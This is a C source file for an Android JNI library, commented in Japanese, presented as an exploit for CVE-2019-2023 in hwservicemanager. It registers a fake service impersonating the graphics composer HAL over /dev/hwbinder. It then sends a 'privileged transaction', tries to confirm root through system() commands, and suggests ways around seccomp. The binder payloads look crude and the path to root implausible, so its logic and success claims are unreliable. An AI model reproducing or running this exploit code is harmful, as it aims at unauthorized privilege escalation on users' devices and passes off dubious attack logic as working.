#define _GNU_SOURCE
#include <jni.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <android/log.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sched.h>
#include <signal.h>
#include <pthread.h>
#include <poll.h>
#include <sys/prctl.h>
#include <linux/seccomp.h>

#include "binder.h"

#define LOG_TAG "CVE-2019-2023"
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
#define LOGW(...) __android_log_print(ANDROID_LOG_WARN, LOG_TAG, __VA_ARGS__)

#define SVC_MGR_ADD_SERVICE 2
#define SVC_MGR_GET_SERVICE 1
#define TARGET_SERVICE "android.hardware.graphics.composer@2.1::IComposer"

static int hwbinder_fd;

// seccomp の状態を確認
int check_seccomp(void) {
    int ret = prctl(PR_GET_SECCOMP, 0, 0, 0, 0);
    if (ret < 0) {
        LOGE("prctl PR_GET_SECCOMP failed: %s", strerror(errno));
        return -1;
    }
    if (ret == 0) {
        LOGI("[+] seccomp is disabled");
        return 0;
    } else if (ret == 2) {
        LOGI("[+] seccomp is enabled (filter mode)");
        return 1;
    } else {
        LOGI("[+] seccomp is enabled (unknown mode: %d)", ret);
        return 1;
    }
}

// サービス登録
int register_fake_service(void) {
    LOGI("[*] Registering fake service with ACL bypass...");

    hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        LOGE("Failed to open /dev/hwbinder: %s", strerror(errno));
        return -1;
    }
    LOGI("[+] hwbinder_fd=%d", hwbinder_fd);

    const char* service_name = TARGET_SERVICE;
    size_t name_len = strlen(service_name) + 1;
    size_t total_len = 4 + name_len;

    uint8_t* data = malloc(total_len);
    if (!data) {
        LOGE("malloc failed");
        close(hwbinder_fd);
        return -1;
    }

    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;

    memset(&tx, 0, sizeof(tx));
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = SVC_MGR_ADD_SERVICE;
    tx.tdata.flags = 0;
    tx.tdata.data_size = total_len;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;

    uint8_t read_buf[4096];
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    int ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);

    if (ret < 0) {
        LOGE("ioctl failed: %s", strerror(errno));
        close(hwbinder_fd);
        return -2;
    }

    LOGI("[+] Service registered successfully!");
    close(hwbinder_fd);
    return 0;
}

// サービス取得
int get_service_handle(void) {
    LOGI("[*] Getting service handle...");

    hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        LOGE("Failed to open /dev/hwbinder: %s", strerror(errno));
        return -1;
    }

    const char* service_name = TARGET_SERVICE;
    size_t name_len = strlen(service_name) + 1;
    size_t total_len = 4 + name_len;

    uint8_t* data = malloc(total_len);
    if (!data) {
        LOGE("malloc failed");
        close(hwbinder_fd);
        return -1;
    }

    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;

    memset(&tx, 0, sizeof(tx));
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = SVC_MGR_GET_SERVICE;
    tx.tdata.flags = 0;
    tx.tdata.data_size = total_len;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;

    uint8_t read_buf[4096];
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    int ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);

    if (ret < 0) {
        LOGE("GET_SERVICE failed: %s", strerror(errno));
        close(hwbinder_fd);
        return -1;
    }

    if (bwr.read_consumed < 4) {
        LOGE("No handle returned");
        close(hwbinder_fd);
        return -1;
    }

    int handle = *(int*)read_buf;
    LOGI("[+] Service handle: %d (0x%x)", handle, handle);

    close(hwbinder_fd);
    return handle;
}

// 特権トランザクション送信
int send_privileged_transaction(int handle) {
    LOGI("[*] Sending privileged transaction to handle %d...", handle);

    hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        LOGE("Failed to open /dev/hwbinder for transaction: %s", strerror(errno));
        return -1;
    }

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
        uint32_t dummy_data;
    } __attribute__((packed)) tx;

    memset(&tx, 0, sizeof(tx));
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = handle;
    tx.tdata.code = 1;
    tx.tdata.flags = 0;
    tx.tdata.data_size = 4;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)&tx.dummy_data;
    tx.dummy_data = 0x12345678;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;

    uint8_t read_buf[4096];
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    int ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    close(hwbinder_fd);

    if (ret < 0) {
        LOGE("Privileged transaction failed: %s", strerror(errno));
        return -1;
    }

    LOGI("[+] Privileged transaction succeeded! Response: %d bytes", bwr.read_consumed);
    return 0;
}

// root 権限確認（seccomp 回避策として system() を使用）
int check_root_via_system(void) {
    LOGI("[*] Attempting to execute system command...");

    // system() は fork + execve を使用するが、seccomp が execve を許可していない場合もある
    // ここでは単純にファイル書き込みで uid を確認
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "echo 'uid=%d' > /data/local/tmp/root_check.log", getuid());
    int ret = system(cmd);

    if (ret < 0) {
        LOGE("system() failed: %s", strerror(errno));
        return -1;
    }

    LOGI("[+] system() executed, check /data/local/tmp/root_check.log");
    return 0;
}

// ========== JNI エントリ ==========
JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeExploitCVE20192023(JNIEnv* env, jclass clazz) {
    int ret;
    int seccomp_state;

    LOGI("========================================");
    LOGI("== CVE-2019-2023 hwservicemanager Exploit ==");
    LOGI("========================================");

    // seccomp 状態確認
    seccomp_state = check_seccomp();
    if (seccomp_state == 1) {
        LOGW("[!] seccomp is enabled! Some operations may fail.");
        LOGW("[!] setuid/execve may be blocked.");
    }

    // Step 1: 偽装サービス登録
    ret = register_fake_service();
    if (ret < 0) {
        LOGE("Failed to register fake service");
        return ret;
    }

    // Step 2: サービスハンドル取得
    int handle = get_service_handle();
    if (handle < 0) {
        LOGE("Failed to get service handle");
        return -1;
    }

    // Step 3: 特権トランザクション送信
    ret = send_privileged_transaction(handle);
    if (ret < 0) {
        LOGE("Failed to send privileged transaction");
    }

    // Step 4: root 権限確認（seccomp の影響を確認）
    ret = check_root_via_system();

    // 現在の UID を確認
    uid_t current_uid = getuid();
    LOGI("[+] Current UID: %d", current_uid);

    if (current_uid == 0) {
        LOGI("[+] SUCCESS! Root obtained (UID=0)");
        system("echo 'uid=0(root)' > /data/local/tmp/root.log");
        system("id >> /data/local/tmp/root.log");
        return 0;
    } else {
        LOGW("[-] Not root (UID=%d)", current_uid);
        LOGW("[!] seccomp is likely blocking setuid/execve");
        LOGW("[!] Consider running as system app or disabling seccomp");
        return -1;
    }
}
